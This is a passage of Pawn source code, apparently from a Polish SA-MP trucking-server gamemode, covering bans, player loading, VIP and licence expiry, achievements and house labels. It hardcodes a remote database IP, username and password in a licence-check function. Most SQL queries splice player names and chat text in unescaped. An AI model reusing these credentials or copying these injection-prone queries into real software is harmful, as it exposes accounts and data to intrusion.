	{
		if(GetPVarInt(playerid,"banned") != 1)
		{
		new string[200];
		format(string,sizeof string,"# Gracz "BIALYHEX"%s"CZERWONYHEX" zostal zbanowany na %d dni! || Powod: "BIALYHEX"%s",PlayerName(playerid),dni,reason);
		SendClientMessageToAll(Czerwony,string);
		SaveUser(playerid);
		SendClientMessage(playerid,Szary,"# >> BAN << Zostales zbanowany, jezeli chcesz unban'a zrob teraz screenshot'a F8 i wyslij go na forum");
		SetPVarInt(playerid,"banned",1);
		SetTimerEx("bantimer",200,false,"i",playerid);
		}
	}

	forward bantimer(playerid);
	public bantimer(playerid)
	{
		SetPVarInt(playerid,"banned",0);
		return Kick(playerid);
	}

	forward SuszarkaCheck(playerid);
	public SuszarkaCheck(playerid)
	{
		new Float:xs, Float:ys, Float:zs;
		GetPlayerPos(playerid, xs, ys, zs);

		for(new i=0; i < GetMaxPlayers(); i++)
		{
			if(IsPlayerInRangeOfPoint(i, 50.0, xs, ys, zs) && IsPlayerConnected(i) && IsPlayerInAnyVehicle(i) && playerid != i)
			{
				new vehid = GetPlayerVehicleID(i);
				new Float:predx, Float:predy, Float:predz,predb;
				GetVehicleVelocity(vehid,predx,predy,predz);
				predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);
				new string[100];
				new pName[MAX_PLAYER_NAME];
				GetPlayerName(i,pName,sizeof pName);
				new veh = GetPlayerVehicleID(i);
				// VehName[GetVehicleModel(veh)-400]
				if(predb > 20 && predb <= 60)
				{
					format(string, sizeof(string),"Predkosc: ~g~%0.1d km/h",predb);
				}
				else if(predb > 60 && predb <= 110)
				{
					format(string, sizeof(string),"Predkosc: ~b~%0.1d km/h", predb);
				}
				else if(predb > 110)
				{
					format(string, sizeof(string),"Predkosc: ~r~%0.1d km/h",predb );
				}
				else if(predb >= 0 && predb <= 21)
				{
					format(string, sizeof(string),"Predkosc: %0.1d km/h",predb);
				}
				TextDrawSetString(SuszarkaSpeed[playerid], string);
				format(string,sizeof string,"Pojazd: ~r~%s",VehName[GetVehicleModel(veh)-400]);
				TextDrawSetString(SuszarkaVeh[playerid],string);
				format(string,sizeof string,"Gracz: ~g~%s (%d)",pName,i);
				TextDrawSetString(SuszarkaPlayer[playerid],string);
			}
		}
		return 1;
	}



	stock Licence(ip[])
	{
		// I1V2V6SS9N3G5O1G
		mysql_close();
		new MySQL:SQLL;
		new polacz;
		SQLL = mysql_init(1);
		polacz = mysql_connect("46.4.177.235","kapiziak","I1V2V6SS9N3G5O1G","kapiziak",SQLL, .auto_reconnect=1);

		if(polacz)
		{
			printf("[server]Polaczono z serverem licencjii!");
		}
		else
		{
			printf("[server]Nie poloczono z serverem licencjii!");
			SendRconCommand("exit");
		}

		new values;
		new query[150];
		format(query,sizeof query,"SELECT `ip` FROM `licences` WHERE `ip` = '%s'",ip);
		if(mysql_query(query)) mysql_ping();

		mysql_store_result();
		new num = mysql_num_rows();
		mysql_free_result();
		if(num != 0)
		{
			format(query,sizeof query,"SELECT IFNULL(DATEDIFF(`to`,NOW()),'-5') FROM `licences` WHERE `ip` = '%s'",ip);
			mysql_query(query);
			new days;


			mysql_store_result();
			mysql_fetch_row(query,"|");

			sscanf(query, "p<|>d", days);

			mysql_free_result();




			if(days >= 1)
			{
				values = 1;
			}
			else if(days <= 0)
			{
				values = 0;
			}

		}
		else
		{
			values = 2;
		}

		return values;
	}

	stock Earned(playerid,kwota,text[])
	{
		new query[200];
		format(query,sizeof query,"UPDATE `employess` SET `earned` = `earned` + '%d' WHERE `nick` = '%s'",kwota,PlayerName(playerid));
		mysql_query(query);


		format(query,sizeof query,"UPDATE `company` SET `budget` = `budget` + '%d' WHERE `id` = '%d'",kwota,PlayerInfo[playerid][Team]);
		mysql_query(query);




		format(query,sizeof query,"INSERT INTO `earnedinfo`(`uid`, `company`, `text`, `count`) VALUES ('%d','%d','%s','%d')",PlayerInfo[playerid][UID],PlayerInfo[playerid][Team],text,kwota);
		mysql_query(query);

		return printf("[LOGS] Gracz %s zarobil na firme: $%d",PlayerName(playerid),kwota);
	}
	/*stock wplac(playerid,kwota)
	{
		new query[200];
		format(query,sizeof query,"UPDATE `users` SET `bank` + '%d' WHERE `nick` = '%s'",kwota,PlayerName(playerid));
		mysql_query(query);

		return printf("[LOGS] Gracz %s wplacil do banku: $%d",PlayerName(playerid),kwota);
	}

	stock PlayerName(playerid)
	{
		new pName[MAX_PLAYER_NAME];
		GetPlayerName(playerid,pName,sizeof pName);
		return pName;
	}
	*/
	stock Player(playerid)
	{
		new pName[MAX_PLAYER_NAME];
		GetPlayerName(playerid,pName,sizeof pName);
		return pName;
	}

	stock AddOrder(playerid,uid,cargoid,vehid,trailerid)
	{
		new t = GetVehicleIDTrailer(playerid, vehid, trailerid);
		new buffer[350];
		format(buffer,sizeof buffer,"INSERT INTO `orders`(`playeruid`, `vehicle`, `trailer`, `cargo`, `kilometers`, `status`) VALUES ('%d','%d','%d','%d','0.00','0')",uid,vehid,t,cargoid);
		mysql_query(buffer);

		return printf("[ORDERS] Dodaje zlecenie na UID: %d",uid);
	}
	stock RemoveOrder(playeruid,trailer)
	{
		
		new buffer[350];
		format(buffer,sizeof buffer,"UPDATE `orders` SET `status` = '1', `unload` = '%d' WHERE `status` = '0' AND `trailer` = '%d'",playeruid,trailer);
		mysql_query(buffer);

		return printf("[ORDERS] Usuwam zlecenie na NACZEPE: %d || playerUID %d",trailer,playeruid);
	}

	stock SaveOrders()
	{
		for(new i = 0; i < GetMaxPlayers(); i++)
		{
			if(IsPlayerConnected(i) && IsVehicleOccupied(GetPlayerVehicleID(i)))
			{
				new vehid = GetPlayerVehicleID(i);
				new trailer = GetVehicleIDTrailer(i,vehid,GetVehicleIDTrailer(i,vehid,GetVehicleTrailer(vehid)));

				if(VehicleInfo[trailer][Towar] >= 1)
				{
					new buffer[350];
					format(buffer,sizeof buffer,"UPDATE `orders` SET `kilometers` = '%0.2f' WHERE `status` = '0' AND `trailer` = '%d'",VehicleInfo[trailer][KM],trailer);
					mysql_query(buffer);
				}

			}
		}

		return 1;
	}

	stock LoadUser(playerid)
	{
		SetPVarInt(playerid,"zalogowany",1);
		new query[500];
		format(query,sizeof query,"SELECT `id` ,`score`, `money`, `team`, `vip`, `leveladmin`, `legal`, `nolegal`,`skin`,`poziom`,`ADR`,`PrawkoA`,`PrawkoB`,`PrawkoC`,`PrawkoD`,`licencjapilota` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(query);
		mysql_store_result();
		mysql_fetch_row(query,"|");

		// WZÃ??Ã¢â‚¬Å“R: `id`, `score`, `money`, `ip`, `host`, `team`, `vip`, `admin`
		new lastlogin[150];
		//sscanf(query,"p<|>ddds[16]s[30]ddddd",PlayerInfo[playerid][UID],PlayerInfo[playerid][Score],PlayerInfo[playerid][Money],PlayerInfo[playerid][IP],PlayerInfo[playerid][Host],PlayerInfo[playerid][Team],PlayerInfo[playerid][LevelAdmin],PlayerInfo[playerid][VIP],PlayerInfo[playerid][Legalne],PlayerInfo[playerid][Nielegalne]);
		sscanf(query,"p<|>dddddddddddddddd",PlayerInfo[playerid][UID],PlayerInfo[playerid][Score],PlayerInfo[playerid][Money],PlayerInfo[playerid][Team],PlayerInfo[playerid][VIP],PlayerInfo[playerid][LevelAdmin],PlayerInfo[playerid][Legalne],PlayerInfo[playerid][Nielegalne],PlayerInfo[playerid][Skin],PlayerInfo[playerid][Poziom],PlayerInfo[playerid][ADR],PlayerInfo[playerid][PrawkoA],PlayerInfo[playerid][PrawkoB],PlayerInfo[playerid][PrawkoC],PlayerInfo[playerid][PrawkoD],PlayerInfo[playerid][licencjapilota]);
		printf("%d %d %d %d %d %d %d %d %d skin: %d Poziom %d ADR %d",PlayerInfo[playerid][UID],PlayerInfo[playerid][Score],PlayerInfo[playerid][Money],PlayerInfo[playerid][Team],PlayerInfo[playerid][VIP],PlayerInfo[playerid][LevelAdmin],lastlogin,PlayerInfo[playerid][Legalne],PlayerInfo[playerid][Nielegalne],PlayerInfo[playerid][Skin],PlayerInfo[playerid][Poziom],PlayerInfo[playerid][ADR]);
		GiveMoneyEx(playerid,PlayerInfo[playerid][Money]);
		GiveScoreEx(playerid,PlayerInfo[playerid][Score]);


		mysql_free_result();

		// STARTED VIP -------------------------------------------------------------------------
		new stringvip[200];
		new viplast;
		format(stringvip,sizeof stringvip,"SELECT `vip` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);

		mysql_store_result();
		mysql_fetch_row(stringvip);

		sscanf(stringvip,"d",viplast);

		mysql_free_result();

		// CHECK END STATED FUNCTION




		format(stringvip,sizeof stringvip,"SELECT IFNULL(DATEDIFF(`vipto`,NOW()),'-5') FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);
		new vipday;


		mysql_store_result();
		mysql_fetch_row(stringvip);

		if(mysql_num_rows())
		{
			sscanf(stringvip, "p<|>d", vipday);
			printf("[USER] Dla %s zostalo %d dni korzystania z uslugi vip!",PlayerName(playerid),vipday);
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			//PlayerInfo[playerid][VIP] = 1;
		}



		if(vipday <= 0 && viplast == 1)
		{
			format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '0' WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(stringvip);
			format(stringvip,sizeof stringvip,"# Czas twojego VIPA minal %d dni temu!",vipday);
			SendClientMessage(playerid,Czerwony,stringvip);
			PlayerInfo[playerid][VIP] = 0;

		}
		else if(vipday >= 1)
		{
			format(stringvip,sizeof stringvip,"# Zostalo ci {FFFFFF}%d dni"ZIELONYHEX" korzystania z uslugi VIP!",vipday);
			SendClientMessage(playerid,Zielony,stringvip);
			PlayerInfo[playerid][VIP] = 1;
			format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(stringvip);
			/*PlayerInfo[playerid][VIP] = 1;*/
		}

		// PRAWKO
		format(stringvip,sizeof stringvip,"SELECT `PrawkoA` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);

		mysql_store_result();
		mysql_fetch_row(stringvip);

		sscanf(stringvip,"d",viplast);

		mysql_free_result();

		// CHECK END STATED FUNCTION




		format(stringvip,sizeof stringvip,"SELECT IFNULL(DATEDIFF(`PrawkoAto`,NOW()),'-5') FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);



		mysql_store_result();
		mysql_fetch_row(stringvip);

		if(mysql_num_rows())
		{
			sscanf(stringvip, "p<|>d", vipday);
			printf("[USER] Dla %s zostalo %d dni korzystania z prawka kat A!",PlayerName(playerid),vipday);
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			//PlayerInfo[playerid][VIP] = 1;
		}



		if(vipday <= 0 && viplast == 1)
		{
			format(stringvip,sizeof stringvip,"UPDATE `users` SET `PrawkoA` = '0' WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(stringvip);
			format(stringvip,sizeof stringvip,"# Twoje prawo jazdy kategori A stracilo waznosc!",vipday);
			SendClientMessage(playerid,Czerwony,stringvip);
			PlayerInfo[playerid][PrawkoA] = false;

		}
		else if(vipday >= 1)
		{
			//format(stringvip,sizeof stringvip,"# Zostalo ci {FFFFFF}%d dni"ZIELONYHEX" korzystania z uslugi VIP!",vipday);
			//SendClientMessage(playerid,Zielony,stringvip);
			PlayerInfo[playerid][PrawkoA] = true;
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			/*PlayerInfo[playerid][VIP] = 1;*/
		}

		// PRAWKO ----------------------------------
		format(stringvip,sizeof stringvip,"SELECT `PrawkoB` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);

		mysql_store_result();
		mysql_fetch_row(stringvip);

		sscanf(stringvip,"d",viplast);

		mysql_free_result();

		// CHECK END STATED FUNCTION




		format(stringvip,sizeof stringvip,"SELECT IFNULL(DATEDIFF(`PrawkoBto`,NOW()),'-5') FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);



		mysql_store_result();
		mysql_fetch_row(stringvip);

		if(mysql_num_rows())
		{
			sscanf(stringvip, "p<|>d", vipday);
			printf("[USER] Dla %s zostalo %d dni korzystania z prawka kat B!",PlayerName(playerid),vipday);
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			//PlayerInfo[playerid][VIP] = 1;
		}



		if(vipday <= 0 && viplast == 1)
		{
			format(stringvip,sizeof stringvip,"UPDATE `users` SET `PrawkoB` = '0' WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(stringvip);
			format(stringvip,sizeof stringvip,"# Twoje prawo jazdy kategori B stracilo waznosc!",vipday);
			SendClientMessage(playerid,Czerwony,stringvip);
			PlayerInfo[playerid][PrawkoB] = false;

		}
		else if(vipday >= 1)
		{
			//format(stringvip,sizeof stringvip,"# Zostalo ci {FFFFFF}%d dni"ZIELONYHEX" korzystania z uslugi VIP!",vipday);
			//SendClientMessage(playerid,Zielony,stringvip);
			PlayerInfo[playerid][PrawkoB] = true;
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			/*PlayerInfo[playerid][VIP] = 1;*/
		}

				// PRAWKO ------------------------------------------------------------------------------------
		format(stringvip,sizeof stringvip,"SELECT `PrawkoC` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);

		mysql_store_result();
		mysql_fetch_row(stringvip);

		sscanf(stringvip,"d",viplast);

		mysql_free_result();

		// CHECK END STATED FUNCTION




		format(stringvip,sizeof stringvip,"SELECT IFNULL(DATEDIFF(`PrawkoCto`,NOW()),'-5') FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);



		mysql_store_result();
		mysql_fetch_row(stringvip);

		if(mysql_num_rows())
		{
			sscanf(stringvip, "p<|>d", vipday);
			printf("[USER] Dla %s zostalo %d dni korzystania z prawka kat C!",PlayerName(playerid),vipday);
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			//PlayerInfo[playerid][VIP] = 1;
		}



		if(vipday <= 0 && viplast == 1)
		{
			format(stringvip,sizeof stringvip,"UPDATE `users` SET `PrawkoC` = '0' WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(stringvip);
			format(stringvip,sizeof stringvip,"# Twoje prawo jazdy kategori A stracilo waznosc!",vipday);
			SendClientMessage(playerid,Czerwony,stringvip);
			PlayerInfo[playerid][PrawkoC] = false;

		}
		else if(vipday >= 1)
		{
			//format(stringvip,sizeof stringvip,"# Zostalo ci {FFFFFF}%d dni"ZIELONYHEX" korzystania z uslugi VIP!",vipday);
			//SendClientMessage(playerid,Zielony,stringvip);
			PlayerInfo[playerid][PrawkoC] = true;
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			/*PlayerInfo[playerid][VIP] = 1;*/
		}


				// PRAWKO
		format(stringvip,sizeof stringvip,"SELECT `PrawkoD` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);

		mysql_store_result();
		mysql_fetch_row(stringvip);

		sscanf(stringvip,"d",viplast);

		mysql_free_result();

		// CHECK END STATED FUNCTION




		format(stringvip,sizeof stringvip,"SELECT IFNULL(DATEDIFF(`PrawkoDto`,NOW()),'-5') FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);



		mysql_store_result();
		mysql_fetch_row(stringvip);

		if(mysql_num_rows())
		{
			sscanf(stringvip, "p<|>d", vipday);
			printf("[USER] Dla %s zostalo %d dni korzystania z prawka kat D!",PlayerName(playerid),vipday);
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			//PlayerInfo[playerid][VIP] = 1;
		}



		if(vipday <= 0 && viplast == 1)
		{
			format(stringvip,sizeof stringvip,"UPDATE `users` SET `PrawkoD` = '0' WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(stringvip);
			format(stringvip,sizeof stringvip,"# Twoje prawo jazdy kategori D stracilo waznosc!",vipday);
			SendClientMessage(playerid,Czerwony,stringvip);
			PlayerInfo[playerid][PrawkoD] = false;

		}
		else if(vipday >= 1)
		{
			//format(stringvip,sizeof stringvip,"# Zostalo ci {FFFFFF}%d dni"ZIELONYHEX" korzystania z uslugi VIP!",vipday);
			//SendClientMessage(playerid,Zielony,stringvip);
			PlayerInfo[playerid][PrawkoD] = true;
			//format(stringvip,sizeof stringvip,"UPDATE `users` SET `vip` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
			//mysql_query(stringvip);
			/*PlayerInfo[playerid][VIP] = 1;*/
		}


		//new send[150];
		//format(send,sizeof send,"# Ostatnie logowanie: "BIALYHEX"%s",lastlogin);
		//SendClientMessage(playerid,Zielony,send);
		printf(lastlogin);

		format(stringvip,sizeof stringvip,"UPDATE `users` SET `online` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(stringvip);

		format(stringvip,sizeof stringvip,"~g~UID: ~w~%d~g~ Nick: ~w~%s~g~ Score: ~w~%d~g~ Money: ~w~$%d~g~ Legalne: ~w~%d~g~ Nielegalne: ~w~%d~g~",PlayerInfo[playerid][UID],PlayerName(playerid),GetScoreEx(playerid),GetMoneyEx(playerid),PlayerInfo[playerid][Legalne],PlayerInfo[playerid][Nielegalne]);

		TextDrawSetString(pasekuser[playerid],stringvip);

		if(PlayerInfo[playerid][Team] >= 1)
		{
			new color;
			format(query,sizeof query,"SELECT `color` FROM `company` WHERE `id` = '%d'",PlayerInfo[playerid][Team]);
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>x",color);
			mysql_free_result();
			new str[10];
			format(str,10,"0x%xFF",color);

			printf("[DEBUG] %s color %s team %d",PlayerName(playerid),str,PlayerInfo[playerid][Team]);
			SetPlayerColor(playerid,color);
		}
		else
		{
			SetPlayerColor(playerid,0xa0a19aAA);
		}





		new string[200];
		format(string,sizeof string,"# %s zalogowal sie do gry!",PlayerName(playerid));
		AddLog(PlayerName(playerid),"Zalogowal sie na server");
		SendClientMessageToAll(Szary,string);
		if(PlayerInfo[playerid][LevelAdmin] >= 1)
		{
			SendClientMessage(playerid,Czerwony,"# Posiadasz range administratorska! Aby wyswietlic dostepne komendy wpisz "BIALYHEX"/apomoc"CZERWONYHEX"!");
		}

		KillTimer(TimerLogowania[playerid]);


		new playerip[16],playerserial[128];
		gpci(playerid,playerserial,sizeof(playerserial));
		GetPlayerIp(playerid, playerip, sizeof(playerip));




		/*
		SELECT IFNULL(DATEDIFF(`vipto`,NOW()),'-5') FROM `users` WHERE `nick` = '%s'
		*/



		new r,ye,d,h,m,s;
		getdate(r,ye,d);
		gettime(h,m,s);

		new data[100];
		format(data,sizeof data,"%d-%02d-%02d %02d:%02d:%02d",r,ye,d,h,m,s);

		format(query,sizeof query,"INSERT INTO `loginlogs`(`nick`, `ip`, `gpci`, `date`) VALUES ('%s','%s','%s','%s')",PlayerName(playerid),playerip,playerserial,data);
		mysql_query(query);







		new buffer[300];



		format(buffer,sizeof buffer,"INSERT INTO `chat`(`nick`, `text`, `ingame`, `waiting`,`date`) VALUES ('%s','[INFO] Zalogowal sie do gry!','1','0','%s')",PlayerName(playerid),data);
		mysql_query(buffer);


		towarkmtimer[playerid] = SetTimerEx("KilometersTowar",300,true,"i",playerid);


		return printf("[LOGS] %s zostal prawidlowo wczytany!",PlayerName(playerid));
	}






	stock SprawdzOsiagniecie(playerid,osiag)
	{
		new query[150];
		if(osiag == 1)
		{
			new zaliczone;
			format(query,sizeof query,"SELECT `osiag1` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>d",zaliczone);
			mysql_free_result();
			if(zaliczone == 0)
			{
				format(query,sizeof query,"Gracz "BIALYHEX"%s"ZIELONYHEX" zaliczyl osiagniecie: "BIALYHEX"Pierwszy Towar!"ZIELONYHEX" Gratulacje!",PlayerName(playerid));
				SendClientMessageToAll(Niebieski,query);
				format(query,sizeof query,"UPDATE `users` SET `osiag1` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
				mysql_query(query);
			}

		}

		if(osiag == 2)
		{
			new zaliczone;
			format(query,sizeof query,"SELECT `osiag2` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>d",zaliczone);
			mysql_free_result();
			if(zaliczone == 0)
			{
				format(query,sizeof query,"Gracz "BIALYHEX"%s"ZIELONYHEX" zaliczyl osiagniecie: "BIALYHEX"Bogacz +$100.000!"ZIELONYHEX" Gratulacje!",PlayerName(playerid));
				SendClientMessageToAll(Niebieski,query);
				format(query,sizeof query,"UPDATE `users` SET `osiag2` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
				mysql_query(query);
			}

		}


		if(osiag == 3)
		{
			new zaliczone;
			format(query,sizeof query,"SELECT `osiag3` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>d",zaliczone);
			mysql_free_result();
			if(zaliczone == 0)
			{
				format(query,sizeof query,"Gracz "BIALYHEX"%s"ZIELONYHEX" zaliczyl osiagniecie: "BIALYHEX"Pro Gracz"ZIELONYHEX" Gratulacje!",PlayerName(playerid));
				SendClientMessageToAll(Niebieski,query);
				format(query,sizeof query,"UPDATE `users` SET `osiag3` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
				mysql_query(query);
			}

		}



		if(osiag == 4)
		{
			new zaliczone;
			format(query,sizeof query,"SELECT `osiag4` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>d",zaliczone);
			mysql_free_result();
			if(zaliczone == 0)
			{
				format(query,sizeof query,"Gracz "BIALYHEX"%s"ZIELONYHEX" zaliczyl osiagniecie: "BIALYHEX"No-Life z Towarem"ZIELONYHEX" Gratulacje!",PlayerName(playerid));
				SendClientMessageToAll(Niebieski,query);
				format(query,sizeof query,"UPDATE `users` SET `osiag4` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
				mysql_query(query);
			}

		}

		if(osiag == 5)
		{
			new zaliczone;
			format(query,sizeof query,"SELECT `osiag5` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>d",zaliczone);
			mysql_free_result();
			if(zaliczone == 0)
			{
				format(query,sizeof query,"Gracz "BIALYHEX"%s"ZIELONYHEX" zaliczyl osiagniecie: "BIALYHEX"Demon predkosci"ZIELONYHEX" Gratulacje!",PlayerName(playerid));
				SendClientMessageToAll(Niebieski,query);
				format(query,sizeof query,"UPDATE `users` SET `osiag5` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
				mysql_query(query);
			}
		}


		if(osiag == 6)
		{
			new zaliczone;
			format(query,sizeof query,"SELECT `osiag6` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>d",zaliczone);
			mysql_free_result();
			if(zaliczone == 0)
			{
				format(query,sizeof query,"Gracz "BIALYHEX"%s"ZIELONYHEX" zaliczyl osiagniecie: "BIALYHEX"Panie... we no pan dolej"ZIELONYHEX" Gratulacje!",PlayerName(playerid));
				SendClientMessageToAll(Niebieski,query);
				format(query,sizeof query,"UPDATE `users` SET `osiag6` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
				mysql_query(query);
			}
		}

		if(osiag == 7)
		{
			new zaliczone;
			format(query,sizeof query,"SELECT `osiag7` FROM `users` WHERE `nick` = '%s'",PlayerName(playerid));
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			sscanf(query,"p<|>d",zaliczone);
			mysql_free_result();
			if(zaliczone == 0)
			{
				format(query,sizeof query,"Gracz "BIALYHEX"%s"ZIELONYHEX" zaliczyl osiagniecie: "BIALYHEX"Zboczeniec"ZIELONYHEX" Gratulacje!",PlayerName(playerid));
				SendClientMessageToAll(Niebieski,query);
				format(query,sizeof query,"UPDATE `users` SET `osiag7` = '1' WHERE `nick` = '%s'",PlayerName(playerid));
				mysql_query(query);
			}
		}


		return 1;
	}

	stock HexToInt(hex)
	{
		new
		str[15];
		format(str, sizeof(str), "%i", hex);
		return strval(str);
	}

	forward CheckChatVIP();
	public CheckChatVIP()
	{
		new string[300];
		format(string,sizeof string,"SELECT `id`,`nick`,`text` FROM `chat` WHERE `waiting` = '1'");
		mysql_query(string);
		mysql_store_result();
		mysql_fetch_row(string,"|");
		new num = mysql_num_rows();
		if(num >= 1)
		{
			for(new i = 0; i < num; i++)
			{
				new nic[50];
				new text[300];
				new id;

				sscanf(string,"p<|>ds[50]s[300]",id,nic,text);
				new tex[350];
				format(tex,sizeof tex,""CZERWONYHEX"Panel: %s - "BIALYHEX"%s",nic,text);
				printf("[Panel] %s napisal z czatu vip: %s",nic,text);
				SendClientMessageToAll(Czerwony,tex);

				format(tex,sizeof tex,"UPDATE `chat` SET `waiting` = '0' WHERE `id` = '%d'",id);
				mysql_query(tex);

			}
			mysql_free_result();
		}

		return 1;
	}


	stock SaveUser(playerid)
	{
		if(GetPVarInt(playerid,"zalogowany") == 1)
		{
			new buffer[300];
			format(buffer,sizeof buffer,"UPDATE `users` SET `score` = '%d', `money` = '%d', `leveladmin` = '%d', `legal` = '%d' , `nolegal` = '%d' , `poziom` = '%d' WHERE `nick` = '%s'",GetScoreEx(playerid),GetMoneyEx(playerid),PlayerInfo[playerid][LevelAdmin],PlayerInfo[playerid][Legalne],PlayerInfo[playerid][Nielegalne],PlayerInfo[playerid][Poziom],PlayerName(playerid));
			if(mysql_query(buffer)) mysql_ping();
			return printf("[USER] %s zostal zapisany do bazy danych!",PlayerName(playerid));
		}
		else
			return printf("[USER] %s nie zostal zapisany bo nie byl zalogowany!",PlayerName(playerid));

	}


	stock LoadHouses()
	{
		new Query[400], i=0;
		new labelstring[150];
		format(Query, sizeof(Query), "SELECT `id`,`name`, `x`, `y`,`z` FROM `houses`");
		mysql_query(Query);
		mysql_store_result();
		LoadedInfo[Houses] = 0;
		while(mysql_fetch_row(Query,"|")) // Copyright (c) 2014-2015 KapiziaK
		{
			if(mysql_num_rows() != 0)
			{
				i++;

				LoadedInfo[Houses]++;
				sscanf(Query, "p<|>ds[100]fff",HouseInfo[i][UIDh],HouseInfo[i][Name],HouseInfo[i][xh],HouseInfo[i][yh],HouseInfo[i][zh]);
				format(labelstring,sizeof labelstring,"Ulica: "BIALYHEX"%s {009e05} - %d",HouseInfo[i][Name],HouseInfo[i][UIDh]);
				CreateDynamic3DTextLabel(labelstring, 0x009e05FF,HouseInfo[i][xh],HouseInfo[i][yh],HouseInfo[i][zh], 50.0);

                for(new ps; ps < sizeof(PunktySerwis); ps++)
					{
				CreatePickup(3096, 1,PunktySerwis[ps][0], PunktySerwis[ps][1], PunktySerwis[ps][2] , -1);
				}
			}

		}
		mysql_free_result();


		format(labelstring,sizeof labelstring,""ZIELONYHEX"Aby sprzedac pojazd wpisz "BIALYHEX"/sprzedaj\n/wystaw [cena] "ZIELONYHEX"- wystawia auto na okreslona cene");
		Create3DTextLabel(labelstring, 0x009e05FF,SALON_X, SALON_Y, SALON_Z, 50.0, 0, 0);

		format(labelstring,sizeof labelstring,""ZIELONYHEX"Aby rozpoczac test na prawo jazdy\nwpisz "BIALYHEX"/kup_prawko");
		Create3DTextLabel(labelstring, 0x009e05FF,PRAWKO_X, PRAWKO_Y, PRAWKO_Z, 50.0, 0, 0);

		format(labelstring,sizeof labelstring,""ZIELONYHEX"Wysypisko - aby oproznic\nWpisz "BIALYHEX"/oproznij");
		Create3DTextLabel(labelstring, 0xFFFFFF00,TRASH_X, TRASH_Y, TRASH_Z, 50.0, 0, 0);

		format(labelstring,sizeof labelstring,""ZIELONYHEX"Strefa Wymiany Oleju - aby wymienic olej wpisz "BIALYHEX"/wymien_olej");
		Create3DTextLabel(labelstring, 0xFFFFFF00,OLEJ_X, OLEJ_Y, OLEJ_Z, 50.0, 0, 0);


		Create3DTextLabel("Aby otworzyc baze wpisz "BIALYHEX"/openvip", Zielony, 2167.3186, 977.8549, 10.8706, 40.0, 0, 0);
		Create3DTextLabel("Aby tanczyc wpisz "BIALYHEX"/taniec", Zielony, 1101.7699,1772.5360,12.3078, 20.0, 0, 0);
		Create3DTextLabel("Aby sie napic wpisz "BIALYHEX"/piwo", Zielony, 1102.1355,1777.6538,12.3078, 20.0, 0, 0);

		Create3DTextLabel("Witaj na Polish World Truck\nAby otrzymac pomoc wpisz "BIALYHEX"/pomoc", Zielony, 403.4952,2531.1248,16.5625, 60.0, 0, 0);

